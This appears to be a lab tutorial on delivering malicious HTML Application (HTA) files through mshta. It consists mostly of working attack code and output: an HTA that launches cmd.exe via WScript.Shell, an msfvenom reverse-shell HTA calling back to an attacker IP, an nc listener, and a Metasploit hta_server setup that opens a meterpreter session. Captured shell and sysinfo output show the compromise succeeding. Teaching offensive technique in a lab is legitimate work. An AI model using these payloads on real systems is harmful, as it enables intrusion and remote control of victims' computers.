# An HTML Application (HTA)

HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool `mshta` is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer.

## Proof of Concept: Executing cmd.exe

In the following example, we will use an `ActiveXObject` in our payload as proof of concept to execute `cmd.exe`. Consider the following HTML code:

```html
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

Then serve the `payload.hta` from a web server. This could be done from the attacking machine as follows:

```bash
user@machine$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
```

On the victim machine, visit the malicious link using Microsoft Edge:

```
http://10.8.232.37:8090/payload.hta
```

Note that `10.8.232.37` is the AttackBox's IP address.

Once we press **Run**, the `payload.hta` gets executed, and then it will invoke `cmd.exe`.

---

## HTA Reverse Connection

We can create a reverse shell payload as follows:

```bash
user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
```

Output:

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hta-psh file: 7692 bytes
Saved as: thm.hta
```

We use `msfvenom` from the Metasploit framework to generate a malicious payload to connect back to the attacking machine. 

On the attacking machine, we need to listen to port 443 using `nc`. Note that this port requires root privileges, or you can use a different one:

```bash
user@machine$ sudo nc -lvp 443
listening on [any] 443 ...
```

Once the victim visits the malicious URL and hits **Run**, we get the connection back:

```
10.8.232.37: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.201.254] 52910
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads>
ipconfig
```

---

## Malicious HTA via Metasploit

Another way to generate and serve malicious HTA files is using the Metasploit framework. First, run Metasploit:

```bash
msfconsole -q
```

Use the `exploit/windows/misc/hta_server` module:

```bash
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
LHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set LPORT 443
LPORT => 443
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37
SRVHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > exploit
```

Output:

```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.8.232.37:443
[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
[*] Server started.
```

On the victim machine, visiting the malicious HTA file results in a reverse connection:

```bash
[*] 10.10.201.254    hta_server - Delivering Payload
[*] Sending stage (175174 bytes) to 10.10.201.254
[*] Meterpreter session 1 opened (10.8.232.37:443 -> 10.10.201.254:61629)
msf6 exploit(windows/misc/hta_server) > sessions -i 1
[*] Starting interaction with 1...
```

### Checking System Information

```bash
meterpreter > sysinfo
Computer        : DESKTOP-1AU6NT4
OS              : Windows 10 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
```

### Opening a Shell

```bash
meterpreter > shell
Process 4124 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\app>